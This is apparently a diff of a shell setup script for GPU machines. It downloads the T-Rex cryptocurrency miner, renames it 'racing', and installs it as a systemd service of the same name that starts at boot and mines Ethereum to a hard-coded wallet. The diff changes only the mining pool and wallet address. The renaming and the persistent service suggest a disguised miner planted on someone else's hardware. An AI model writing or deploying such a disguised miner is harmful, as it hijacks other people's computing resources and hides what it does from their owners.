@@ -18,7 +18,7 @@ sudo systemctl start nvidia-fabricmanager
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 0x0afd8A6e2d4403D7d3aB98B66d6e5D67C3e6fb21 -p x -w ${woker}_leevipu\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p x -w ${woker}_ip\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 ./racing -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4  -p x -w $woker &
